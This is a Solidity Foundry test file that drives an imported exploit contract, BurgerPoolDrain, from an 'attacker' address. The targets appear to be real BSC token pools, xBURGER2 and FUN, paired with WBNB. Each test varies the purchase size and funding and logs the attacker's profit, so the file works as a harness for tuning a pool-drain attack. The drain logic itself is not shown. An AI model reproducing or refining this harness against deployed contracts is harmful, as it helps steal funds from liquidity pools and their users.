// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerPoolDrain.sol";

contract BurgerPoolTest7 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant xBURGER2 = 0xAFE24E29Da7E9b3e8a25c9478376B6AD6AD788dD;
    address constant FUN = 0xCC89AC2C6f4a82e5A4c53215b6a6d7ebA4C25E6a;

    function _testPool(
        address token, uint256 buyWbnb, uint256 pairPct, uint256 fundBnb
    ) internal returns (int256) {
        address att = makeAddr("attacker");
        vm.deal(att, fundBnb);
        vm.startPrank(att);

        uint256 bef = att.balance;
        BurgerPoolDrain e = new BurgerPoolDrain();

        try e.attack{value: fundBnb - 1 ether}(token, buyWbnb, 0, pairPct) {
            vm.stopPrank();
            return int256(att.balance) - int256(bef);
        } catch {
            vm.stopPrank();
            return type(int256).min;
        }
    }

    function test_xburger2_1400() public {
        int256 d = _testPool(xBURGER2, 1400 ether, 50, 2000 ether);
        emit log_named_int("xBURGER2 1400", d);
    }

    function test_xburger2_1500() public {
        int256 d = _testPool(xBURGER2, 1500 ether, 50, 2000 ether);
        emit log_named_int("xBURGER2 1500", d);
    }

    function test_fun_250() public {
        int256 d = _testPool(FUN, 250 ether, 50, 400 ether);
        emit log_named_int("FUN 250", d);
    }

    function test_fun_300() public {
        int256 d = _testPool(FUN, 300 ether, 50, 500 ether);
        emit log_named_int("FUN 300", d);
    }
}
